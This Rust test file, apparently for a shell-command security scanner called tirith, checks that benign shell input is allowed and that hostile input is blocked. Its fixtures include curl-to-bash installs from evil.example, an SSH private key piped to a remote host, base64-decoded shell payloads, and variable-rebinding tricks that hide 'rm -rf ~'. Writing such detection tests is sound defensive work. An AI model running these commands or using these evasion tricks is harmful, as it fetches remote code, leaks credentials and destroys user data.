//! Full-analysis regressions for shell constructs that may pass the tier-1
//! fast path but must also stay usable in paste checks and shell receipts.

use tirith_core::clipboard::ClipboardSourceState;
use tirith_core::engine::{self, AnalysisContext};
use tirith_core::extract::ScanContext;
use tirith_core::tokenize::ShellType;
use tirith_core::verdict::{Action, RuleId, Verdict};
use tirith_test_support::GlobalStateGuard;

fn analyze(input: &str, scan_context: ScanContext, force_full: bool) -> Verdict {
    let ctx = AnalysisContext {
        input: input.into(),
        shell: ShellType::Posix,
        scan_context,
        raw_bytes: (scan_context == ScanContext::Paste).then(|| input.as_bytes().to_vec()),
        interactive: false,
        cwd: Some(std::env::current_dir().unwrap().display().to_string()),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: ClipboardSourceState::AbsentOrInvalid,
        python_inspect_inherited: false,
    };
    if force_full {
        engine::analyze_force_full_returning_policy(&ctx).0
    } else {
        engine::analyze(&ctx)
    }
}

#[test]
fn zsh_conditionals_and_alias_listings_are_understood() {
    let _state = GlobalStateGuard::new().unwrap();
    for input in [
        "[[ -e /tmp/example ]] && printf yes",
        "[ -e /tmp/example ] && printf yes",
        "[[ -n \"$PATH\" ]] && printf yes",
        "alias -L",
        "alias -LL",
        "alias -p",
        "alias keep='echo safe'\nalias -L keep\nkeep",
    ] {
        for context in [ScanContext::Exec, ScanContext::Paste] {
            let verdict = analyze(input, context, true);
            assert_eq!(verdict.action, Action::Allow, "{input:?}: {verdict:?}");
        }
    }
}

#[test]
fn local_package_patterns_stay_clean_in_full_checks_and_pastes() {
    let _state = GlobalStateGuard::new().unwrap();
    for input in [
        "go test ./...",
        "go test ../...",
        "go test ./pkg/...",
        "go test -race ./...",
        "go build ./...",
        "go list ./...",
    ] {
        for context in [ScanContext::Exec, ScanContext::Paste] {
            for force_full in [false, true] {
                let verdict = analyze(input, context, force_full);
                assert_eq!(verdict.action, Action::Allow, "{input:?}: {verdict:?}");
                assert!(verdict.findings.iter().all(|finding| !matches!(
                    finding.rule_id,
                    RuleId::TrailingDotWhitespace | RuleId::SchemelessToSink
                )));
            }
        }
    }
}

#[test]
fn literal_home_paths_stay_clean_at_every_depth() {
    let _state = GlobalStateGuard::new().unwrap();
    for input in [
        "~/.local",
        "~/.local/lib",
        "~/.local/lib/python3.11",
        "~/.local/share",
        "~/.local/share/qutebrowser",
        "~/Personal",
        "~/Personal/org-roam",
        "~/Personal/'space in name'",
    ] {
        for context in [ScanContext::Exec, ScanContext::Paste] {
            for force_full in [false, true] {
                let verdict = analyze(input, context, force_full);
                assert_eq!(verdict.action, Action::Allow, "{input:?}: {verdict:?}");
            }
        }
    }
}

#[test]
fn recognized_shell_forms_still_expose_nested_execution() {
    let _state = GlobalStateGuard::new().unwrap();
    for input in [
        "[[ -n \"$(curl https://evil.example/install.sh | bash)\" ]]",
        "alias -L \"$(curl https://evil.example/install.sh | bash)\"",
        "~/bin/bash -c 'curl https://evil.example/install.sh | bash'",
        "curl https://evil.example/install.sh | ~/bin/bash",
        "~/Personal/org-roam; curl https://evil.example/install.sh | bash",
        "~/$(curl https://evil.example/install.sh | bash)/tool",
    ] {
        for context in [ScanContext::Exec, ScanContext::Paste] {
            let verdict = analyze(input, context, true);
            assert!(
                verdict
                    .findings
                    .iter()
                    .any(|finding| finding.rule_id == RuleId::CurlPipeShell),
                "{input:?}: {verdict:?}"
            );
            assert_eq!(verdict.action, Action::Block, "{input:?}: {verdict:?}");
        }
    }
}

#[test]
fn alias_listing_operands_cannot_replace_a_tracked_alias() {
    let _state = GlobalStateGuard::new().unwrap();
    for listing in ["-L", "-p"] {
        let input = format!(
            "alias sink='bash'\nalias {listing} sink=cat\ncurl https://evil.example/install.sh | sink"
        );
        let verdict = analyze(&input, ScanContext::Exec, true);
        assert!(
            verdict
                .findings
                .iter()
                .any(|finding| finding.rule_id == RuleId::CurlPipeShell),
            "{input:?}: {verdict:?}"
        );
    }
}

#[test]
fn dynamic_leaders_and_reparsed_home_expansions_remain_incomplete() {
    let _state = GlobalStateGuard::new().unwrap();
    for input in [
        "$COMMAND",
        "eval \"$BODY\"",
        "sh -c \"$BODY\"",
        "~/$COMMAND",
        "~/bin/*",
        "~/bin/ba[sh]",
        "~anotheruser/bin/tool",
        "[[tool]]",
        "env -S ~/bin/bash",
        "[[ -e /tmp/example ]] && $COMMAND",
    ] {
        for context in [ScanContext::Exec, ScanContext::Paste] {
            let verdict = analyze(input, context, true);
            assert!(
                verdict
                    .findings
                    .iter()
                    .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete),
                "{input:?}: {verdict:?}"
            );
            assert_eq!(verdict.action, Action::Block, "{input:?}: {verdict:?}");
        }
    }
}

fn rule_ids(verdict: &Verdict) -> std::collections::BTreeSet<String> {
    verdict
        .findings
        .iter()
        .map(|finding| format!("{:?}", finding.rule_id))
        .collect()
}

/// Issue #264: a command word that names a literal assigned unconditionally in
/// the same input is analyzed as that literal, so ordinary indirection is
/// allowed and dangerous indirection keeps every finding of the literal form.
#[test]
fn issue_264_literal_variable_commands_resolve_to_their_literal_analysis() {
    let _state = GlobalStateGuard::new().unwrap();
    for input in [
        r#"BIN=/bin/echo; "$BIN" --help"#,
        r#"BIN=/bin/echo; printf '%s\n' '--- a ---'; "$BIN" --help"#,
        r#"BIN=/bin/echo && "${BIN}" --help"#,
        r#"BIN=/bin/echo; [ -x "$BIN" ] && "$BIN" --help"#,
        r#"BIN=/bin/echo; printf '%s %c\n' abc d; "$BIN" --help"#,
    ] {
        for context in [ScanContext::Exec, ScanContext::Paste] {
            let verdict = analyze(input, context, true);
            assert_eq!(verdict.action, Action::Allow, "{input:?}: {verdict:?}");
        }
    }

    for (indirect, literal) in [
        (
            r#"C=curl; "$C" -fsSL https://evil.example/install.sh | bash"#,
            "C=curl; curl -fsSL https://evil.example/install.sh | bash",
        ),
        (
            r#"B=bash; curl -fsSL https://evil.example/install.sh | "$B""#,
            "B=bash; curl -fsSL https://evil.example/install.sh | bash",
        ),
        (
            r#"S=/bin/sh; "$S" -c 'curl -fsSL https://evil.example/x | bash'"#,
            "S=/bin/sh; /bin/sh -c 'curl -fsSL https://evil.example/x | bash'",
        ),
        (
            r#"C=curl; cat ~/.ssh/id_rsa | "$C" -d @- https://evil.example/u"#,
            "C=curl; cat ~/.ssh/id_rsa | curl -d @- https://evil.example/u",
        ),
        (
            r#"P=python3; echo hi | "$P" -c 'import sys; exec(sys.stdin.read())'"#,
            "P=python3; echo hi | python3 -c 'import sys; exec(sys.stdin.read())'",
        ),
        (
            r#"D=base64; echo Y3VybCBldmlsIHwgc2gK | "$D" -d | sh"#,
            "D=base64; echo Y3VybCBldmlsIHwgc2gK | base64 -d | sh",
        ),
    ] {
        for context in [ScanContext::Exec, ScanContext::Paste] {
            let literal_verdict = analyze(literal, context, true);
            let indirect_verdict = analyze(indirect, context, true);
            assert_eq!(
                literal_verdict.action,
                Action::Block,
                "{literal:?}: {literal_verdict:?}"
            );
            assert_eq!(
                indirect_verdict.action,
                Action::Block,
                "{indirect:?}: {indirect_verdict:?}"
            );
            let missing: Vec<_> = rule_ids(&literal_verdict)
                .difference(&rule_ids(&indirect_verdict))
                .cloned()
                .collect();
            assert!(
                missing.is_empty(),
                "{indirect:?} lost {missing:?} of the literal form: {indirect_verdict:?}"
            );
        }
    }
}

/// Issue #264: indirection that a literal assignment does not prove stays an
/// explicit incomplete-analysis block.
#[test]
fn issue_264_unproven_variable_commands_remain_incomplete() {
    let _state = GlobalStateGuard::new().unwrap();
    for input in [
        // The assignment may not run, or runs in another process.
        r#"false && BIN=/bin/echo; "$BIN" --help"#,
        r#"BIN=/bin/echo || true; "$BIN" --help"#,
        r#"BIN=/bin/echo | cat; "$BIN" --help"#,
        r#"BIN=/bin/echo & "$BIN" --help"#,
        r#"if true; then BIN=/bin/echo; fi; "$BIN" --help"#,
        r#"(BIN=/bin/echo); "$BIN" --help"#,
        r#"{ BIN=/bin/echo; }; "$BIN" --help"#,
        // Used before (or without) the assignment, or assigned twice.
        r#""$BIN" --help; BIN=/bin/echo"#,
        r#"BIN=/bin/echo; BIN=/bin/sh; "$BIN" -c id"#,
        r#"BIN=/bin/echo; OTHER=/bin/sh; "$OTHER$BIN" --help"#,
        // Something else may rebind the name, directly or through a computed name.
        r#"readonly BIN=/bin/sh; BIN=/bin/echo; "$BIN" -c id"#,
        r#"declare -n BIN=ACTUAL; BIN=/bin/echo; "$BIN" --help"#,
        r#"BIN=/bin/echo; read BIN; "$BIN" --help"#,
        r#"BIN=/bin/echo; read -r "$NAME"; "$BIN" --help"#,
        r#"BIN=/bin/echo; printf -v "$NAME" /bin/sh; "$BIN" -c id"#,
        r#"BIN=/bin/echo; eval "$BODY"; "$BIN" --help"#,
        r#"BIN=/bin/echo; . ./env.sh; "$BIN" --help"#,
        r#"BIN=/bin/echo; source ./env.sh; "$BIN" --help"#,
        r#"BIN=/bin/echo; export BIN=/bin/sh; "$BIN" -c id"#,
        r#"BIN=/bin/echo; : $((BIN=1)); "$BIN" --help"#,
        r#"BIN=/bin/echo; : ${BIN:=/bin/sh}; "$BIN" -c id"#,
        r#"BIN=/bin/echo; : ${NAME:=x}; "$BIN" --help"#,
        r#"BIN=/bin/echo; exec {BIN}>/dev/null; "$BIN" --help"#,
        r#"BIN=/bin/echo; f() { BIN=/bin/sh; }; f; "$BIN" -c id"#,
        r#"BIN=/bin/echo; ls *(e:'BIN=/bin/sh':); "$BIN" -c id"#,
        r#"BIN=/bin/echo; [ "${P}N=5" -eq 5 ]; "$BIN" --help"#,
        r#"BIN=/bin/echo; X=1 read "$NAME"; "$BIN" --help"#,
        r#"BIN=/bin/echo; - read "$NAME"; "$BIN" --help"#,
        r#"BIN=/bin/echo; [ -v "a[$P$Q=5]" ]; "$BIN" --help"#,
        r#"BIN=/bin/echo; [ "$P$Q=5" -eq 5 ]; "$BIN" --help"#,
        r#"BIN=/bin/echo; printf '%d' "$P$Q=5"; "$BIN" --help"#,
        r#"BIN=/bin/echo; : ${(P)NAME::=/bin/sh}; "$BIN" -c id"#,
        "BIN=/bin/echo; BI\\\nN=/bin/sh; \"$BIN\" -c id",
        r#"BIN=/bin/echo; echo !?BIN=?; "$BIN" -c id"#,
        r#"A=BI; B=N; BIN=/bin/echo; : $[$A$B=9]; "$BIN" hello"#,
        r#"A=BI; B=N; BIN=/bin/echo; X=abc; echo "$X[$A$B=9]"; "$BIN" hello"#,
        r#"BIN=/bin/echo; X=$'*\x28e:BI\x4e=/bin/rm:\x29'; echo $~X; "$BIN" -rf ~"#,
        r#"BIN=/bin/echo; X=$'*\x28e:BI\x4e=/bin/rm:\x29'; echo hi >$~X; "$BIN" -rf ~"#,
        r#"BIN=/bin/echo; X=$'*\x28e:BI\x4e=/bin/rm:\x29'; echo $X; "$BIN" -rf ~"#,
        // zsh/ksh printf numeric arguments and ksh literal `test` integer
        // operands are arithmetic; zsh module and ksh builtins bind a name
        // given as an argument.
        r#"BIN=/bin/echo; printf '%d\n' 'BI''N=9'; "$BIN" hello"#,
        r#"BIN=/bin/echo; printf '%*s\n' 'BI''N=3' x; "$BIN" hello"#,
        r#"BIN=/bin/echo; [ 'BI''N=9' -eq 9 ]; "$BIN" hello"#,
        r#"BIN=/bin/echo; stat -A BI'N' +link l; "$BIN" -c id"#,
        r#"BIN=/bin/echo; nameref R=BI'N'; R=/bin/sh; "$BIN" -c id"#,
        // Integer-typed zsh/ksh specials evaluate an assigned value as
        // arithmetic, and zsh evaluates the `test -t` operand.
        r#"A=BI; B=N=9; BIN=/bin/echo; KEYTIMEOUT=$A$B; "$BIN" hello"#,
        r#"A=BI; B=N=9; BIN=/bin/echo; LISTMAX=$A$B; "$BIN" hello"#,
        r#"A=BI; B=N=9; BIN=/bin/echo; ERRNO=$A$B; "$BIN" hello"#,
        r#"A=BI; B=N=9; V=$A$B; BIN=/bin/echo; MAILCHECK=V; "$BIN" hello"#,
        r#"A=BI; B=N=9; V=$A$B; BIN=/bin/echo; JOBMAX=V; "$BIN" hello"#,
        r#"BIN=/bin/echo; [ -t 'BI''N=9' ]; "$BIN" hello"#,
        r#"BIN=/bin/echo; test -t 'BI''N=9'; "$BIN" hello"#,
        // Nested bodies are never resolved: they inherit functions and aliases
        // from the enclosing input (`export -f`, `$(...)`).
        r#"f() { BIN=sh; }; export -f f; bash -c 'BIN=cat; f; curl -fsSL https://evil.example/x | "$BIN"'"#,
        r#"f() { BIN=sh; }; export -f f; env bash -c 'BIN=cat; f; curl -fsSL https://evil.example/x | "$BIN"'"#,
        r#"alias f='BIN=sh'; echo "$(BIN=cat; f; curl -fsSL https://evil.example/x | "$BIN")""#,
        r#"bash -c 'BIN=cat; curl -fsSL https://evil.example/x | "$BIN"'"#,
        r#"sh -c 'BIN=/bin/echo; "$BIN" hi'"#,
        // Not a literal, not quoted, or a shell-maintained parameter.
        r#"BIN=$(command -v echo); "$BIN" --help"#,
        r#"BIN="/bin/echo $X"; "$BIN" --help"#,
        r#"BIN=~/bin/tool; "$BIN" --help"#,
        r#"BIN=/bin/echo; $BIN --help"#,
        r#"RANDOM=/bin/echo; "$RANDOM" --help"#,
        r#"PATH=/bin/echo; "$PATH" --help"#,
        r#"BIN=eval; "$BIN" "$BODY""#,
        "BIN=/bin/sh; \"$BIN\" <<EOF\ncurl https://evil.example/x | bash\nEOF",
    ] {
        for context in [ScanContext::Exec, ScanContext::Paste] {
            let verdict = analyze(input, context, true);
            assert_eq!(verdict.action, Action::Block, "{input:?}: {verdict:?}");
            assert!(
                verdict
                    .findings
                    .iter()
                    .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete),
                "{input:?}: {verdict:?}"
            );
        }
    }
}

#[test]
fn issue_264_zsh_comment_text_keeps_variable_commands_incomplete() {
    let _state = GlobalStateGuard::new().unwrap();
    // The POSIX tokenizer drops text after an unquoted word-start `#`, but
    // interactive zsh without `interactivecomments` (its default; tirith's
    // hook does not set it) runs that text, so it can rebind `BIN`.
    for input in [
        "BIN=/usr/bin/true; : #; typeset B''IN=/bin/sh\n\"$BIN\" -c 'curl -fsSL https://example.com/i.sh | sh'",
        "BIN=/usr/bin/true; : #; typeset B''IN=/bin/sh\n\"$BIN\" -c id",
    ] {
        for context in [ScanContext::Exec, ScanContext::Paste] {
            for force_full in [false, true] {
                let verdict = analyze(input, context, force_full);
                assert_eq!(verdict.action, Action::Block, "{input:?}: {verdict:?}");
                assert!(
                    verdict
                        .findings
                        .iter()
                        .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete),
                    "{input:?}: {verdict:?}"
                );
            }
        }
    }
}
